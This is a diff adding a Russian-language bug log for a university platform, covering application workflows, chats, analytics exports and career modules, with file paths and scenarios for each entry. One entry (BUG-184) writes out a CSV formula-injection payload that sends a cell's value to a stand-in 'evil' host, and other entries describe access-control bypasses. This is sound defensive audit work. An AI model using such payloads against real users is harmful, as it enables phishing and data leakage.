@@ -1028,6 +1028,455 @@
 - **Где:** `apps/api/src/modules/career/companies.controller.ts:115` (`@Query('search')` без схемы — массив даёт `500`), `apps/api/src/modules/career/resume.controller.ts:61` (TS-тип вместо DTO), `apps/api/src/modules/application-services/dto/revoke-certificate.dto.ts:6` (схема в `apps/api`)
 - **Ожидается:** BACKEND_RULES §3 — все входные данные через схему `shared-schemas`, query так же строго, как body.
 
+## Проход 3 — модули целиком (24.10.2026)
+
+Каждый модуль API вместе с его экранами пройден метод за методом. Записи сгруппированы по модулю;
+серьёзность — в заголовке. Где корень совпадает с ранее записанным багом, указан его номер.
+
+### Заявки и записи в деканат
+
+#### BUG-131 · 🟠 Сотрудник не видит ответов анкеты заявки (`formData`) — ни в рабочем окне, ни студент после отправки
+- **Роль:** DEAN, UNIVERSITY_ADMIN, UNIVERSITY_MODERATOR; STUDENT · **Статус:** подтверждён
+- **Где:** `apps/web/src/widgets/applications/ui/staff-workspace.tsx:107-126`, `apps/web/src/widgets/applications/ui/application-detail.tsx:123-149`; API `apps/api/src/modules/application-services/applications.service.ts:296-375` отдаёт `formData` кодами полей без подписей
+- **Сценарий:** студент пишет причину академического отпуска или цель справки — декан видит
+  студента, документы, историю, но не ответы анкеты (`formData` в вебе только в мастере).
+  Решение «подготовить / отклонить» — вслепую.
+- **Ожидается:** PROJECT §3.2 — рабочее место показывает ответы с подписями полей услуги.
+
+#### BUG-132 · 🟡 Запросить замену можно только у одного документа за цикл проверки
+- **Роль:** сотрудники заявок → STUDENT · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/application-documents.service.ts:162-173`, `apps/web/src/widgets/applications/ui/staff-workspace.tsx:135,451`
+- **Сценарий:** первый «Запросить замену» переводит в NEEDS_CORRECTION, второй — `400
+  «Недопустимый переход»`, кнопки пропадают (`canReview = IN_REVIEW`). Каждый документ — отдельный круг.
+- **Ожидается:** пометка нескольких документов за одну проверку (§3.2).
+
+#### BUG-133 · 🟡 В NEEDS_CORRECTION студент не может исправить ответы анкеты
+- **Роль:** STUDENT, STAROSTA · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/applications.service.ts:114-132,518-524` (`updateDraft` только DRAFT), `apps/web/src/widgets/applications/ui/application-detail.tsx:194-257`
+- **Сценарий:** «в поле „Цель справки“ укажите организацию» — править негде, `PATCH` отвечает
+  `400`. Остаётся отправить без изменений или подать заново с новым номером и сроком.
+- **Ожидается:** NEEDS_CORRECTION → RESUBMITTED позволяет править `formData` и `deliveryType`.
+
+#### BUG-134 · 🟡 Заявку, брошенную в NEEDS_CORRECTION, закрыть нельзя — вечно «просрочена» в ежедневной сводке
+- **Роль:** сотрудники заявок · **Статус:** новый
+- **Где:** `packages/shared-schemas/src/application-services.ts:70` (нет NEEDS_CORRECTION → REJECTED), `apps/api/src/modules/application-services/application-process.service.ts:531-538`, `application-notifier.ts:27-33`, `apps/web/src/widgets/applications/ui/staff-workspace.tsx:332`
+- **Ожидается:** обработчик закрывает с причиной, или ожидание студента не считается просрочкой (§16, `notifyOverdueApplications`).
+
+#### BUG-135 · 🟡 🔒 Отказ после выдачи справки оставляет её действительной, а отозвать из веба нельзя
+- **Роль:** сотрудники заявок; проверяющие `/verify` · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/application-process.service.ts:177-190`, `apps/web/src/widgets/applications/ui/staff-workspace.tsx:57-61,104,142-150`
+- **Сценарий:** справка выпущена в IN_PREPARATION, затем заявку отклонили — `/verify/<код>`
+  отвечает VALID, у студента документ «Выданные университетом»; для REJECTED блок результатов и
+  «Отозвать» недоступны.
+- **Ожидается:** отказ отзывает справку или запрещён при действующем результате (§8.3 «Выгрузки»).
+
+#### BUG-136 · 🟡 Отозванная справка засчитывается как результат: «Готово» без действующего документа, перевыпуск невозможен
+- **Роль:** сотрудники заявок → STUDENT · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/application-process.service.ts:240-242,447-452`, `apps/web/src/widgets/applications/ui/staff-workspace.tsx:296`, `application-detail.tsx:162-169`
+- **Ожидается:** отозванный результат не считается и помечен в UI; перевыпуск после отзыва возможен.
+
+#### BUG-137 · 🟡 🔒 Справку «является обучающимся» выдают отчисленному и выпускнику
+- **Роль:** сотрудники заявок; третьи лица · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/application-process.service.ts:253-256`, `study-certificate-pdf.ts:188`
+- **Сценарий:** `academicStatus` читается, но не проверяется — официальный документ с QR, `/verify` VALID.
+- **Ожидается:** отказ для неактивного статуса через общий хелпер обоих представлений (корень BUG-002).
+
+#### BUG-138 · 🟡 🔒 Документ, приложенный к заявке, меняется после проверки — «Принят» остаётся
+- **Роль:** STUDENT → сотрудники заявок · **Статус:** новый
+- **Где:** `apps/api/src/modules/documents/documents.service.ts:473-476,557-572` (`assertNotLockedByReview` смотрит только `DocumentSubmissionItem`), `apps/api/src/modules/application-services/application-documents.service.ts:134-154`
+- **Ожидается:** как у запросов документов (§3.8): правка блокируется на время работы с заявкой или строка возвращается в PENDING.
+
+#### BUG-139 · 🟡 🔒 Код получения оригинала не сверяется: сотрудник видит его сам, веб выдаёт без кода
+- **Роль:** сотрудники заявок ↔ STUDENT · **Статус:** подтверждён
+- **Где:** `apps/web/src/widgets/applications/ui/staff-workspace.tsx:125,224-228`, `apps/web/src/entities/application-service/api/application-service-api.ts:350-352`, `apps/api/src/modules/application-services/applications.service.ts:305`
+- **Ожидается:** §8.3 — `issue` принимает `pickupCode` и сверяет; код не показывается обработчику.
+
+#### BUG-140 · 🟡 В исправлении «Убрать» ещё не проверенный документ — требование пропадает, заявка застревает
+- **Роль:** STUDENT, STAROSTA · **Статус:** новый
+- **Где:** `apps/web/src/widgets/applications/ui/application-detail.tsx:197-207`, `document-checklist.tsx:216-226`, `apps/api/src/modules/application-services/application-documents.service.ts:101-111`, `applications.service.ts:242`
+- **Ожидается:** чек-лист исправления по требованиям услуги, а не по приложенным строкам.
+
+#### BUG-141 · 🟡 Ответственный, потерявший право обработки, остаётся единственным адресатом уведомлений
+- **Роль:** DEAN, UNIVERSITY_ADMIN, UNIVERSITY_MODERATOR · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/application-notifier.ts:137-144,174-185,249-255`
+- **Сценарий:** бывший декан (теперь TEACHER или другой факультет) — уведомление о повторной отправке не уходит никому, сводка просрочки идёт ему с `url: undefined`.
+- **Ожидается:** адресат проходит `ApplicationPolicy.canProcess`, иначе запасная цепочка.
+
+#### BUG-142 · 🟢 В истории заявки студенту показывается внутренний id сотрудника
+- **Роль:** STUDENT, STAROSTA · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/application-process.service.ts:139`, `apps/web/src/widgets/applications/ui/application-detail.tsx:333-335`
+
+#### BUG-143 · 🟢 Кнопка «Отозвать справку» есть у любого результата с номером
+- **Роль:** сотрудники заявок · **Статус:** новый
+- **Где:** `apps/web/src/widgets/applications/ui/staff-workspace.tsx:624-629` (бумажный результат → `404`)
+
+#### BUG-144 · 🟢 Обязательный флажок проходит невыбранным, а ответ «нет» требует двух кликов
+- **Роль:** STUDENT, STAROSTA · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/form-validation.ts:66-74`, `apps/web/src/widgets/applications/ui/create-wizard.tsx:187-195`
+
+#### BUG-145 · 🟢 Шаг «Проверка» мастера печатает коды вариантов и `true`/`false`
+- **Роль:** STUDENT, STAROSTA · **Статус:** новый
+- **Где:** `apps/web/src/widgets/applications/ui/create-wizard.tsx:463-472`
+
+#### BUG-146 · 🟢 «Продолжить черновик» недоступной услуги — пустой экран без ошибки
+- **Роль:** STUDENT, STAROSTA · **Статус:** новый
+- **Где:** `apps/web/src/widgets/applications/ui/create-wizard.tsx:112-121,329,489`
+
+#### BUG-147 · 🟢 Список заявок студента обрезан на 50 без пагинации
+- **Роль:** STUDENT, STAROSTA · **Статус:** новый
+- **Где:** `apps/web/src/widgets/applications/ui/student-applications-view.tsx:95-98`
+
+#### BUG-148 · 🟢 Offset-пагинация очереди заявок без уникального тай-брейкера
+- **Роль:** сотрудники заявок · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/applications.service.ts:276` (сортировка по статусу/датам без `id` — дубли и пропуски между страницами)
+
+#### BUG-149 · 🟢 Настройки каталога `requiresPickup`, `allowStorage`, `allowUpload`, `maxFiles` ни на что не влияют
+- **Роль:** UNIVERSITY_ADMIN, PLATFORM_ADMIN → STUDENT · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/application-process.service.ts:444`, `application-documents.service.ts:32-52`, `apps/web/src/widgets/applications/ui/document-checklist.tsx:22-69`
+
+#### BUG-150 · 🟢 `GET /applications/:id`: вложенные `events`, `documents`, `results` без `take` (корень BUG-049)
+- **Где:** `apps/api/src/modules/application-services/applications.service.ts:319-373` · **Статус:** новый
+
+#### BUG-151 · 🟢 `@Query('fileId')` без схемы — массив даёт `500` (корень BUG-130)
+- **Где:** `apps/api/src/modules/application-services/applications.controller.ts:146-153` · **Статус:** новый
+
+#### BUG-152 · 🟢 В очереди заявок нет фильтра READY (новое место BUG-044)
+- **Где:** `apps/web/src/widgets/applications/ui/dean-applications-view.tsx:38-46` · **Статус:** новый
+
+#### BUG-153 · 🟢 Отправка заявки не перепроверяет, что приложенный документ жив и с файлами
+- **Роль:** STUDENT → сотрудники · **Статус:** новый
+- **Где:** `apps/api/src/modules/application-services/applications.service.ts:478-500`, `application-documents.service.ts:41-52`
+
+#### BUG-154 · 🟢 Названия требований в истории и в окне сотрудника только по-русски
+- **Где:** `apps/api/src/modules/application-services/application-documents.service.ts:81,150`, `apps/web/src/widgets/applications/ui/staff-workspace.tsx:422` · **Статус:** новый
+
+#### BUG-155 · 🟢 Записи в деканат: отмена и завершение без подтверждения (как BUG-014)
+- **Где:** `apps/web/src/views/appointments/ui/student-appointments-view.tsx:76`, `dean-appointments-view.tsx:254-265` · **Статус:** новый
+
+#### BUG-156 · 🟢 Ссылка «Связанная заявка» в записи ведёт на общий список
+- **Где:** `apps/web/src/views/appointments/ui/student-appointments-view.tsx:177` (нужно `/applications/${id}`) · **Статус:** новый
+
+#### BUG-157 · 🟢 Потолок «5 открытых записей в деканат» обходится параллельными запросами
+- **Где:** `apps/api/src/modules/appointments/appointments.service.ts:105-124` (`count` + `create` без лока) · **Статус:** новый
+
+#### BUG-158 · 🟢 Время записи в деканат — в поясе браузера (новое место BUG-103)
+- **Где:** `apps/web/src/views/appointments/ui/create-appointment-modal.tsx:29-33,61`, `confirm-appointment-modal.tsx:38`, `dean-appointments-view.tsx:145`, `student-appointments-view.tsx:156` · **Статус:** новый
+
+#### BUG-159 · 🟢 Удаление аккаунта оставляет открытые заявки и записи в очередях (новое место BUG-067)
+- **Где:** `apps/api/src/modules/users/users.service.ts:2030` · **Статус:** новый
+
+### Чаты
+
+#### BUG-160 · 🟡 🔒 Цитату при ответе можно подделать — приписать собеседнику слова, которых он не писал
+- **Роль:** все участники чатов, в том числе официальных · **Статус:** новый
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:1997-2006,2418-2425` (`replyQuote` сохраняется как пришло; то же в `sendMessageRest`/`sendMessageFromUploads`), веб `apps/web/src/widgets/chat-window/ui/message-item.tsx:298-302`
+- **Сценарий:** `message:send { replyToId: <сообщение декана>, replyQuote: "Пересдачи не будет" }` — у всех блок цитаты с именем декана и этим текстом.
+- **Ожидается:** §8.3 — `replyQuote` — фрагмент оригинала; сервер отклоняет цитату, которой нет в `replyTo.content`.
+
+#### BUG-161 · 🟡 🔒 Пересланное сообщение можно отредактировать — подпись «Переслано от X» остаётся
+- **Роль:** все участники чатов · **Статус:** новый
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:2518-2540,2930-2936`, веб `apps/web/src/entities/chat/ui/message-context-menu.tsx:188-192`
+- **Ожидается:** правка пересылок запрещена на сервере и в меню.
+
+#### BUG-162 · 🟡 🔒 Забаненный выходит из группы — бан стирается, и он возвращается по ссылке-приглашению
+- **Роль:** забаненный → админы группы · **Статус:** новый
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:1922-1927,3717-3721,3753-3764`
+- **Ожидается:** §8.3 «забаненный → 403», §9.1 — `deleteOrLeaveChat` отказывает забаненному или сохраняет строку с баном.
+
+#### BUG-163 · 🟡 🔒 Закрепление, правка и «печатает» обходят блокировку, потолок запроса и антифлуд
+- **Роль:** все; хуже всего адресат запроса и заблокировавший · **Статус:** новый
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:2597-2623` (`setPinned` без `assertCanSend`, служебное сообщение на каждое закрепление), `:2518`, `apps/api/src/modules/chats/chats.gateway.ts:305-336`
+- **Ожидается:** §8.3 — все пути отправки через `assertCanSend`; §50 — потолок непринятого запроса.
+
+#### BUG-164 · 🟡 Кнопка «Покинуть» в панели чата не работает почти ни у кого
+- **Роль:** участники групп, владелец, все в неличных чатах · **Статус:** новый
+- **Где:** `apps/web/src/widgets/chat-window/ui/chat-details-panel.tsx:1091,1099-1101,1340-1356`; сервер `chats.service.ts:1779-1785,3396-3417`
+- **Сценарий:** кнопка зовёт исключение `DELETE /chats/:id/members/:me` — рядовому `FORBIDDEN`, владельцу `FORBIDDEN`, «Избранное»/официальные — `WRONG_SCOPE`; у админа в ленте «исключил».
+- **Ожидается:** выход через `DELETE /chats/:id`.
+
+#### BUG-165 · 🟡 Ошибки WS-событий чата клиент не слушает — правка и удаление молча теряются
+- **Роль:** все с чатами · **Статус:** новый
+- **Где:** нет подписки на `error` в `apps/web/src/shared/realtime/*` и `widgets/chat-window` (сервер шлёт в `chats.gateway.ts:74,92,114,123-126`); `chat-window.tsx:2170-2174,2313-2339,2382-2387`
+- **Сценарий:** правка после окна или длиннее 4000 знаков, массовое удаление с чужими, `RATE_LIMIT`/`MAINTENANCE` — интерфейс считает действие выполненным.
+- **Ожидается:** FRONTEND_RULES §5.4, PROJECT §9.1 — обработка `error` с текстом по коду.
+
+#### BUG-166 · 🟡 Папку чатов нельзя изменить, если один из её чатов покинут
+- **Роль:** все с папками · **Статус:** новый
+- **Где:** `apps/api/src/modules/chats/chat-folders.service.ts:29-50,134-146`, веб `chat-window.tsx:816-827`, `chat-folders-panel.tsx:136-137,348-350`
+- **Ожидается:** сервер отбрасывает недоступные id, а не отказывает во всей правке.
+
+#### BUG-167 · 🟡 Новое сообщение в «прыгнутом» окне ломает порядок ленты и отмечает непросмотренное прочитанным
+- **Роль:** все участники чатов · **Статус:** новый
+- **Где:** `apps/web/src/widgets/chat-window/ui/chat-window.tsx:1621-1634,2242-2249,2796-2800`
+- **Ожидается:** §9.4 — пока окно «прыгнуло», живые сообщения не в хвост; прочтение только по непрерывной ленте.
+
+#### BUG-168 · 🟡 Опрос «несколько ответов» без переголосования: второй вариант не выбрать, ошибки молчат
+- **Роль:** участники опросов в чатах · **Статус:** новый
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:1612-1615`, веб `apps/web/src/entities/chat/ui/chat-poll.tsx:40-43,59-70`, `widgets/chat-window/ui/poll-creator.tsx:118-120`
+
+#### BUG-169 · 🟢 «Удалённый у себя» чат и очищенная история находятся глобальным поиском и видны в закреплённых
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:2635-2643,2769-2785` (без `clearedWhere`) · **Статус:** новый
+
+#### BUG-170 · 🟢 🔒 Админ группы исключает и банит других админов и меняет аватар — контракт говорит «только создатель»
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:1779-1785,3396-3417,3441-3446,3511-3520` · **Статус:** новый
+
+#### BUG-171 · 🟢 Окно чата остаётся открытым после исключения, бана, удаления группы или отказа в запросе
+- **Где:** `apps/web/src/widgets/chat-window/ui/chat-window.tsx:1679-1684,2936,4129` · **Статус:** новый
+
+#### BUG-172 · 🟢 Повторное «Написать» скрытому у себя личному чату открывает окно без шапки и плашки блокировки
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:550,852-857` (`createChat` не снимает `hiddenAt`), веб `chat-window.tsx:658-664`, `widgets/user-profile/ui/public-user-profile.tsx:107` · **Статус:** новый
+
+#### BUG-173 · 🟢 Пересылка поста из ленты даёт пустой пузырь; опрос и спойлер при пересылке теряются
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:2896-2943` · **Статус:** новый
+
+#### BUG-174 · 🟢 Догон не узнаёт о снятии закрепа; удалённое закреплённое висит в плашке у других
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:1278-1289,2549-2560,2604-2609`, веб `chat-window.tsx:1832-1843` · **Статус:** новый
+
+#### BUG-175 · 🟢 Список чатов: курсор по меняющемуся `updatedAt` даёт дубли строк
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:584-586`, веб `apps/web/src/entities/chat/api/chat-api.ts:77-90`, `entities/chat/lib/sort-chats.ts` · **Статус:** новый
+
+#### BUG-176 · 🟢 Исключение «не участника» создаёт в ленте ложное «исключил X»
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:1786-1801` (`deleteMany` без проверки `count`) · **Статус:** новый
+
+#### BUG-177 · 🟢 Разбан проходит беззвучно, всё написанное за время бана становится непрочитанным
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:3553-3561` · **Статус:** новый
+
+#### BUG-178 · 🟢 Множественный выбор: пересылка в порядке кликов, удаление чужих молча не срабатывает
+- **Где:** `apps/web/src/widgets/chat-window/ui/chat-window.tsx:2170-2174,3409` · **Статус:** новый
+
+#### BUG-179 · 🟢 Реакция — любая строка до 16 знаков, а не эмодзи
+- **Где:** `packages/shared-schemas/src/chats.ts:331`, `apps/api/src/modules/chats/chats.service.ts:2842-2870` — набор из `CHAT_REACTION_EMOJIS`; правка `shared-schemas` — стоп-точка · **Статус:** новый
+
+#### BUG-180 · 🟢 Оптимистичные медиа сверяются по размеру до сжатия; повтор теряет цитату и «без звука»
+- **Где:** `apps/web/src/widgets/chat-window/ui/chat-window.tsx:1144-1149,1183-1195,1457-1465,2363-2369` · **Статус:** новый
+
+#### BUG-181 · 🟢 Выгрузка чата: «[вложение]» по-русски в kk/en; повтор `locale` в query даёт `500` (корень BUG-130)
+- **Где:** `apps/api/src/modules/chats/chats.service.ts:997,3113`, `chats.controller.ts:383-389`, `apps/api/src/common/export/export-branding.service.ts:78` · **Статус:** новый
+
+#### BUG-182 · 🟢 Очередь поддержки тянет всю команду по каждому обращению — вложенная выборка без `take`
+- **Где:** `apps/api/src/modules/chats/support.service.ts:37-39` · **Статус:** новый
+
+#### BUG-183 · 🟢 После вступления по ссылке человек попадает в общий список, а не в группу
+- **Где:** `apps/web/src/app/join-chat/[id]/page.tsx:60-61` (нужно `/chats?c=<id>`) · **Статус:** новый
+
+### Аналитика и выгрузки
+
+#### BUG-184 · 🟠 🔒 CSV-выгрузки исполняют формулы из имён, названий групп, факультетов и компаний
+- **Роль:** кто открывает файл (админ вуза, декан, карьерный центр, PLATFORM_*); атакующий — студент или работодатель · **Статус:** подтверждён
+- **Где:** `apps/api/src/common/export/spreadsheet.builder.ts:94-98` (`buildCsv` только берёт в кавычки); источники — `apps/api/src/modules/users/users.service.ts:2607-2608`, `apps/api/src/modules/career/career-report.export.ts:284-286`, `apps/api/src/modules/analytics/analytics-report.export.ts:166-167`
+- **Сценарий:** студент ставит имя `=HYPERLINK("https://evil/?x="&A2;"Открыть")` — админ открывает CSV в Excel/LibreOffice, ячейка исполняется: фишинг, утечка соседних ячеек, DDE. XLSX безопасен (строки типом `s`).
+- **Ожидается:** значения с ведущими `= + - @ \t \r` экранировать в `buildCsv` (OWASP CSV Injection).
+
+#### BUG-185 · 🟡 🔒 Порог малых групп обходится вычитанием между уровнями отчёта
+- **Роль:** UNIVERSITY_ADMIN/MODERATOR, PLATFORM_* · **Статус:** новый
+- **Где:** `apps/api/src/modules/analytics/analytics-report.service.ts:178-193,320-352`
+- **Сценарий:** строка «Факультет F» из отчёта вуза минус видимые группы отчёта факультета F = точные показатели скрытой малой группы.
+- **Ожидается:** §8.3 «иначе разность раскрыла бы группу» — вторичное подавление.
+
+#### BUG-186 · 🟡 Дашборд платформы: при окне 90 дней «За сутки» — недельные уникальные, «За неделю» — 13 дней
+- **Где:** `apps/api/src/modules/analytics/platform-analytics.service.ts:248-266`, `apps/web/src/widgets/platform-dashboard/ui/platform-dashboard.tsx:74` · **Статус:** новый
+
+#### BUG-187 · 🟡 Тренд посещаемости вуза рисует точки факультетов не на своих неделях
+- **Где:** `apps/api/src/modules/analytics/university-analytics.service.ts:180-207` (ряд без досыпки нулей), `apps/web/src/widgets/stats-dashboard/ui/stats-dashboard.tsx:258-271,623`, `chart-data.ts:22` · **Статус:** новый
+
+#### BUG-188 · 🟡 «Активных студентов» за учебный год считается только за последние 90 дней
+- **Где:** `apps/api/src/modules/analytics/analytics-report.service.ts:546-557` (источник `audit_logs`), `apps/api/src/modules/cleanup/cleanup.service.ts:99` (`AUDIT_RETENTION_DAYS = 90`) · **Статус:** новый
+
+#### BUG-189 · 🟡 Любая ошибка скачивания файла — «Ошибка сервера»; протухший токен не продлевается
+- **Роль:** все, кто скачивает отчёты, `/me/export`, списки, резюме, выгрузку чата · **Статус:** новый
+- **Где:** `apps/web/src/shared/lib/download-file.ts:20` (`responseType: 'blob'`), `apps/web/src/shared/api/instance.ts:115,154`
+- **Сценарий:** у ошибки тело — `Blob`, `code` всегда `undefined`: 429, 400, 403 — «Ошибка сервера»; 401 `TOKEN_EXPIRED` не лечится refresh.
+- **Ожидается:** §8.2 — разбирать Blob как JSON до проверки кода.
+
+#### BUG-190 · 🟡 Сбой запроса на экранах аналитики выдаётся за «всё в порядке» или вечный скелетон
+- **Где:** `apps/web/src/views/dean-analytics/ui/dean-analytics-view.tsx:214-218`, `views/dean-analytics/ui/group-drilldown.tsx:77-132`, `views/dean-dashboard/ui/dean-dashboard.tsx:215-218,245-248`, `widgets/stats-dashboard/ui/stats-dashboard.tsx:100-107,275-278,328-331,417-420,487-490,532,571`, `widgets/platform-dashboard/ui/platform-dashboard.tsx:232-233,895` · **Статус:** новый
+- **Сценарий:** 500 на `/analytics/at-risk` — декан видит «Никто не требует внимания».
+- **Ожидается:** FRONTEND_RULES §9 — состояние ошибки с повтором.
+
+#### BUG-191 · 🟢 Факультет без отметок — «Посещаемость 0 %» красным, группы без отметок первыми как худшие
+- **Где:** `apps/api/src/modules/analytics/analytics.service.ts:14-16,283,287,298` (`rateOf` → 0 вместо `null`) · **Статус:** новый
+
+#### BUG-192 · 🟢 «Пик пар при N учебных аудиториях» считает пары во всех помещениях, а аудитории — только `AUDITORIUM`
+- **Где:** `apps/api/src/modules/analytics/university-analytics.service.ts:270-281` · **Статус:** новый
+
+#### BUG-193 · 🟢 Early Warning: просрочки считаются по случайной части заданий и вычитают сдачи старой группы
+- **Где:** `apps/api/src/modules/analytics/analytics.service.ts:184-199,385-389,424-425` (`take: 20000` без порядка) · **Статус:** новый
+
+#### BUG-194 · 🟢 Выгрузка своих данных неполна (чёрный список, выданные доступы, журнал своих документов, свои выгрузки), а сверка D-F26 этого не видит
+- **Где:** `apps/api/src/modules/data-export/data-export.service.ts:1116`, `data-export.service.spec.ts:222-227` (сверяются только `@relation`) · **Статус:** новый
+
+#### BUG-195 · 🟢 🔒 В журнал `DocumentExport` уходит строка поиска выгрузки пользователей (email, ФИО) без срока хранения
+- **Где:** `apps/api/src/common/export/export-registry.service.ts:121,231-244`, `apps/api/src/modules/users/users.service.ts:574-580` · **Статус:** новый
+
+#### BUG-196 · 🟢 Номера строк в ошибках импорта сдвигаются из-за пустых строк; потолок колонок не действует для CSV
+- **Где:** `apps/api/src/modules/invites/bulk-parse.ts:61,69-70`, `apps/api/src/modules/library/library-import.service.ts:76,91-92`, `apps/api/src/common/import/table-file.ts:24-62` · **Статус:** новый
+
+#### BUG-197 · 🟢 Границы недель и учебного года в аналитике — по UTC (корень «время не в поясе вуза»)
+- **Где:** `apps/api/src/modules/analytics/university-analytics.service.ts:350-385,481-490`, `analytics-report.service.ts:597-604` · **Статус:** новый
+
+#### BUG-198 · 🟢 Плитка «Просрочено» у модератора вуза упирается в 200
+- **Где:** `apps/web/src/views/moderator-dashboard/ui/university-moderator-dashboard.tsx:105-110,149-164` · **Статус:** новый
+
+### Карьера
+
+#### BUG-199 · 🟠 🔒 Работодатель получает полный профиль студента через `GET /users/:id` в обход согласий, скрытого карьерного профиля и допуска к вузу
+- **Роль:** EMPLOYER → STUDENT, STAROSTA · **Статус:** подтверждён
+- **Где:** `apps/api/src/modules/users/users.controller.ts:302-307` (без `@Roles`), `apps/api/src/modules/users/users.service.ts:1089-1160,1195-1212,1234-1258,1443-1468`; id берётся из воронки `apps/api/src/modules/career/applications.service.ts:230-241`
+- **Сценарий:** карьерный профиль `HIDDEN`, согласий нет, карточка кандидата — 404; но `GET /users/<id из воронки>` отдаёт телефон, email, соцсети, навыки, группу. Работает и для вуза с отозванным допуском.
+- **Ожидается:** PROJECT «Профиль кандидата и согласия»; `career-profile.service.ts:24-28` — «работодатель никогда не читает `User` напрямую».
+
+#### BUG-200 · 🟠 Карьерное мероприятие создать нельзя: `careerKind` не принимает ни один эндпоинт
+- **Роль:** организаторы; STUDENT, STAROSTA — зрители · **Статус:** новый
+- **Где:** `packages/shared-schemas/src/events.ts:81,84` (`.strict()` без `careerKind`), `apps/api/src/modules/career/career-events.service.ts:26-31`, `apps/web/src/views/career/ui/career-events-view.tsx`
+- **Ожидается:** PROJECT «Прочее» — `Event.careerKind`; раздел «Карьерные мероприятия» сейчас пуст везде, кроме сида.
+
+#### BUG-201 · 🟡 🔒 Статус компании `BLOCKED` нигде не действует, кроме подачи заявки в вуз
+- **Где:** `apps/api/src/modules/career/career-access.service.ts:36-46,82-104,119-155`, `vacancies.service.ts:115-260`, `applications.service.ts:211-313`, `career-profile.service.ts:172-179`, `companies.service.ts:264-267,790-802` · **Статус:** новый
+- **Ожидается:** `26-career.prisma:16-18` — «BLOCKED перекрывает любые выданные допуски».
+
+#### BUG-202 · 🟡 Процент совпадения сравнивает город вакансии со страной студента
+- **Где:** `apps/api/src/modules/career/vacancies.service.ts:469-481` (`city: user.country`), `packages/shared-schemas/src/career.ts:526-531` · **Статус:** новый
+
+#### BUG-203 · 🟡 В карьерном профиле нельзя указать желаемые позиции, готовность к переезду и валюту — «Предпочтения» недостижимы
+- **Где:** `apps/web/src/views/career/ui/career-profile-view.tsx:68-82,211-300`, `packages/shared-schemas/src/career.ts:325-329`, `apps/api/src/modules/career/career-profile.service.ts:266` · **Статус:** новый
+
+#### BUG-204 · 🟡 Сводка вуза считает «на модерации» решения по приостановленным и закрытым вакансиям — очередь пуста
+- **Где:** `apps/api/src/modules/career/career-analytics.service.ts:65-69,177-182`, очередь `vacancies.service.ts:356-360` · **Статус:** новый
+
+#### BUG-205 · 🟡 Отчёт «за год» сравнивает неполный текущий учебный год с полным прошлым
+- **Где:** `apps/api/src/modules/career/career-report.service.ts:115-148,657-665`, `apps/web/src/views/career/ui/career-analytics-view.tsx:551` · **Статус:** новый
+
+#### BUG-206 · 🟡 Модератор одобряет вакансию, не видя зарплаты, города, навыков, формата и срока
+- **Где:** `apps/web/src/views/career/ui/career-vacancy-review-view.tsx:159-187` · **Статус:** новый
+
+#### BUG-207 · 🟢 Таблица факультетов в отчёте карьеры молча обрезается на 10 строк
+- **Где:** `apps/api/src/modules/career/career-report.service.ts:289-294,321-329` · **Статус:** новый
+
+#### BUG-208 · 🟢 Карьерный профиль теряет несохранённые правки при переключении видимости или согласия
+- **Где:** `apps/web/src/views/career/ui/career-profile-view.tsx:56,64,70-82` · **Статус:** новый
+
+#### BUG-209 · 🟢 Закрыть вакансию, отозвать отклик, «Принят»/«Оффер» — в один клик без подтверждения
+- **Где:** `apps/web/src/views/employer/ui/employer-vacancies-view.tsx:183-187`, `views/career/ui/career-applications-view.tsx:151-155`, `views/employer/ui/employer-candidates-view.tsx:192-198` · **Статус:** новый
+
+#### BUG-210 · 🟢 Тосты и экраны карьеры показывают сырой русский `message` сервера
+- **Где:** `toApiError(error).message` в 10 файлах `apps/web/src/views/career/**` и `views/employer/**` (`career-profile-view.tsx:59,65`, `career-companies-view.tsx:102`, `career-resume-view.tsx:38,60`, …) · **Статус:** новый
+
+#### BUG-211 · 🟢 Формы работодателя (и логин, инвайт, сброс пароля) показывают английские сообщения Zod
+- **Где:** `apps/web/src/views/employer/ui/employer-signup-view.tsx:80-125`, `employer-company-view.tsx:84-102`; тот же корень в `features/login`, `auth-invite`, `password-reset` · **Статус:** новый
+
+#### BUG-212 · 🟢 Нет состояния ошибки на обзоре карьеры, в профиле, резюме и кабинете компании
+- **Где:** `apps/web/src/views/career/ui/career-view.tsx:120-124,175,230,604-640`, `career-profile-view.tsx:84`, `career-resume-view.tsx:63`, `views/employer/ui/employer-company-view.tsx:66` · **Статус:** новый
+
+#### BUG-213 · 🟢 Допуск со сроком из веба не выдать; плитка «Истекает» ведёт на «На рассмотрении»
+- **Где:** `apps/web/src/views/career/ui/career-companies-view.tsx:218-223`, `career-view.tsx:254-261` · **Статус:** новый
+
+#### BUG-214 · 🟢 Компания не узнаёт, что её допуск истёк
+- **Где:** `apps/api/src/modules/career/companies.service.ts:591-637` (`expireAccess` без `notifier.accessDecided`) · **Статус:** новый
+
+#### BUG-215 · 🟢 Истёкший, но не погашенный cron допуск: «Доступ открыт» и повторную заявку не подать
+- **Где:** `apps/web/src/views/employer/ui/employer-access-view.tsx:159`, `apps/api/src/modules/career/companies.service.ts:333-335` · **Статус:** новый
+
+#### BUG-216 · 🟢 Рекрутёру показываются кнопки владельца, которые сервер отклоняет
+- **Где:** `apps/web/src/views/employer/ui/employer-access-view.tsx:195`, `employer-company-view.tsx:106`, `entities/company/model/types.ts:4-15` · **Статус:** новый
+
